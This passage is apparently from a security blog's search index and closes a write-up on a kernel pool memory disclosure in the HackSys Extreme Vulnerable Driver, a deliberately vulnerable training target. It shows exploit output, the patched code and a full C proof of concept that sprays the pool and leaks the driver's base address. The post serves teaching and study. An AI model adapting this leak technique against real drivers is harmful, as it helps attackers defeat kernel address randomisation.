0n30\n\nC:\\Users\\admin\\Desktop&gt;NonPagedPoolNxMemoryDisclosure.exe\n[+] HEVD: NonPagedPoolNx Memory Disclosure!\n[*] Opening handle to the driver!\n        [+] Opened Driver Handle: 0x80\n[+] Starting pool spray!\n    [!] Match from 515 to 519\n    [+] Address of HEVD!UaFObjectCallback: 0xfffff800c47680c0\n    [+] Base Address of HEVD: 0xfffff800c46e0000\n</code></pre>","title":"Final Result"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#fix","tags":["windows-kernel-exploitation"],"text":"<p>Fixing the vulnerability is pretty simple. Instead of doing a read with the size specified by the user, the read is instead done with the size which is specified for the allocation itself. That way the read is only ever the same size as the allocated chunk. Below is a cleaned up output of the fixed version from the HEVD source.</p> Patched Vulnerability<pre><code>        DbgPrint(\"[+] Allocating Pool chunk\\n\");\n\n        KernelBuffer = ExAllocatePoolWithTag(\n            NonPagedPoolNx,\n            (SIZE_T)POOL_BUFFER_SIZE,\n            (ULONG)POOL_TAG\n        );\n\n        if (!KernelBuffer)\n        {\n            //\n            // Unable to allocate Pool chunk\n            //\n            DbgPrint(\"[-] Unable to allocate Pool chunk\\n\");\n\n            Status = STATUS_NO_MEMORY;\n            return Status;\n        }\n        else\n        {\n            DbgPrint(\"[+] Pool Tag: %s\\n\", STRINGIFY(POOL_TAG));\n            DbgPrint(\"[+] Pool Type: %s\\n\", STRINGIFY(NonPagedPoolNx));\n            DbgPrint(\"[+] Pool Size: 0x%zX\\n\", (SIZE_T)POOL_BUFFER_SIZE);\n            DbgPrint(\"[+] Pool Chunk: 0x%p\\n\", KernelBuffer);\n        }\n\n        RtlFillMemory(KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE, 0x41);\n\n        ProbeForWrite(UserOutputBuffer, (SIZE_T)POOL_BUFFER_SIZE, (ULONG)__alignof(UCHAR));\n\n        DbgPrint(\"[+] UserOutputBuffer: 0x%p\\n\", UserOutputBuffer);\n        DbgPrint(\"[+] UserOutputBuffer Size: 0x%zX\\n\", Size);\n        DbgPrint(\"[+] KernelBuffer: 0x%p\\n\", KernelBuffer);\n        DbgPrint(\"[+] KernelBuffer Size: 0x%zX\\n\", (SIZE_T)POOL_BUFFER_SIZE);\n\n        // Secure Note: This is secure because the developer is passing a size\n        // equal to size of the allocated Pool chunk to RtlCopyMemory()/memcpy().\n        // Hence, there will be no out of bound read of kernel mode memory\n\n        RtlCopyMemory(UserOutputBuffer, KernelBuffer, (SIZE_T)POOL_BUFFER_SIZE); // (1)\n</code></pre> <ol> <li>The copy here uses the size of the allocated pool buffer, not a size specified from user-mode.</li> </ol>","title":"Fix"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#full-exploit","tags":["windows-kernel-exploitation"],"text":"<p>Thanks for reading, I hope you enjoyed! You can find my full proof of concept below.</p> <pre><code>#include &lt;Windows.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;Psapi.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define DRIVER \"\\\\\\\\.\\\\HacksysExtremeVulnerableDriver\"\n#define IOCTL_CODE 0x0022204f\n#define IOCTL_UAF 0x00222053\n\n/* Function to open a handle to the driver */\nHANDLE OpenDriverHandle(void)\n{\n    HANDLE DriverHandle = NULL;\n\n    /* Opens handle to driver */\n    DriverHandle = CreateFileA(DRIVER, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (DriverHandle == INVALID_HANDLE_VALUE) // If handle cant open, exit.\n    {\n        printf(\"\\t[!] FATAL: Failed to open driver handle!\\n\");\n        exit(-1);\n    }\n    else\n    {\n        printf(\"\\t[+] Opened Driver Handle: 0x%x\\n\", DriverHandle);\n        return DriverHandle; // Return handle to driver to be used later.\n    }\n}\n\nvoid PoolSpray(HANDLE DriverHandle)\n{\n    HANDLE  EventObjects[5000] = {0};\n    DWORD   BytesReturned;\n\n    /* Spray 10,000 Event Objects and 10,000 UAF Objects */\n    for (int i = 0; i &lt;= 5000; i++)\n    {\n        HANDLE EventHandle = CreateEventA(NULL, FALSE, FALSE, NULL);\n        EventObjects[i] = EventHandle;\n\n        DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &amp;BytesReturned, NULL);\n    }\n    //DeviceIoControl(DriverHandle, IOCTL_UAF, NULL, 0, NULL, 0, &amp;BytesReturned, NULL);\n\n    /* Free event objects */\n    for (int i = 0; i &lt;= 5000; i++)\n    {\n        CloseHandle(EventObjects[i]);\n        EventObjects[i] = NULL;\n    }\n}\n\nvoid exploit(HANDLE DriverHandle)\n{\n    DWORD           BytesReturned;\n    char            OutputBuffer[0x270] = {0};\n    ULONGLONG       HevdBaseAddress;\n\n    char search[5] = \"Hack\";\n    int pos_search = 0;\n    int pos_text = 0;\n    int len_search = 4;\n    int len_text = 0x270;\n    BOOL Match = FALSE;\n\n    printf(\"[+] Starting pool spray!\\n\");\n    for (int i = 0; i &lt;= 100; i++)\n    {\n        PoolSpray(DriverHandle);\n        DeviceIoControl(DriverHandle, IOCTL_CODE, NULL, 0, &amp;OutputBuffer, sizeof(OutputBuffer), &amp;BytesReturned, NULL);\n\n        for (pos_text = 0; pos_text &lt; len_text - len_search; ++pos_text)\n        {\n            if (OutputBuffer[pos_text] == search[pos_search])\n            {\n                ++pos_search;\n                if (pos_search == len_search)\n                {\n                    printf(\"\\t[!] Match from %d to %d\\n\", pos_text-len_search, pos_text);\n                    Match = TRUE;\n                    break;\n                }\n            }\n            else\n            {\n                pos_text -= pos_search;\n                pos_search = 0;\n            }\n        }\n\n        if (Match == TRUE)\n        {\n            for (int i = 0; i &lt;= 0x270; i++)\n            {\n                unsigned long long *UOutputBuffer;\n                UOutputBuffer = (unsigned long long *)OutputBuffer;\n                //printf(\"0x%llx\\n\", UOutputBuffer[i]);\n\n                /* Check if we leaked kernel address */\n                if ((UOutputBuffer[i] &amp; 0xfffff00000000000) == 0xfffff00000000000)\n                {\n                    printf(\"\\t[+] Address of HEVD!UaFObjectCallback: 0x%llx\\n\", UOutputBuffer[i]);\n                    printf(\"\\t[+] Base Address of HEVD: 0x%llx\\n\", UOutputBuffer[i] - 0x880C0);\n\n                    // 0: kd&gt; ? 0xfffff8051b3880c0 - HEVD\n                    // Evaluate expression: 557248 = 00000000`000880c0\n                    HevdBaseAddress = UOutputBuffer[i] + 0x880C0;\n                    break;\n                }\n            }\n            break;\n        }\n    }\n    printf(\"[*] Closing handle!\\n\");\n    CloseHandle(DriverHandle);\n}\n\nint main()\n{\n    printf(\"[+] HEVD: NonPagedPoolNx Memory Disclosure!\\n\");\n\n    printf(\"[*] Opening handle to the driver!\\n\");\n    HANDLE DriverHandle = OpenDriverHandle();\n\n    exploit(DriverHandle);\n}\n</code></pre> <p>Exploit on  </p>","title":"Full Exploit"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#acknowledgements","tags":["windows-kernel-exploitation"],"text":"<p>Thanks to myself for putting up with myself trying lots of very dumb ideas.</p>","title":"Acknowledgements"},{"location":"Posts/2022/2022-06-11-HEVD3-MemoryDisclosure/#references","tags":["windows-kernel-exploitation"],"text":"<ul> <li>[1] - https://docs.microsoft.com/en-us/windows/win32/api/ioapiset/nf-ioapiset-deviceiocontrol</li> <li>[2] - https://stackoverflow.com/questions/13450809/how-to-search-a-string-in-a-char-array-in-c</li> <li>[3] = https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/MemoryDisclosureNonPagedPoolNx.c</li> </ul>","title":"References"},{"location":"tags/","text":"","title":"Tags"},{"location":"tags/#ctf","text":"<ul> <li>NetSecFocus BSides Cymru AES Challenge</li> <li>BAE x BSides Chelt CTF</li> </ul>","title":"ctf"},{"location":"tags/#hypervisor-exploitation","text":"<ul> <li>Analysis of a VMWare Guest-to-Host Escape from Pwn2Own 2017</li> </ul>","title":"hypervisor-exploitation"},{"location":"tags/#windows-kernel-exploitation","text":"<ul> <li>HackSys Extreme Vulnerable Driver 3 - Stack Overflow + SMEP Bypass</li> <li>HackSys Extreme Vulnerable Driver 3 - Double Fetch</li> <li>HackSys Extreme Vulnerable Driver 3 - Memory Disclosure</li> </ul>","title":"windows-kernel-exploitation"}]}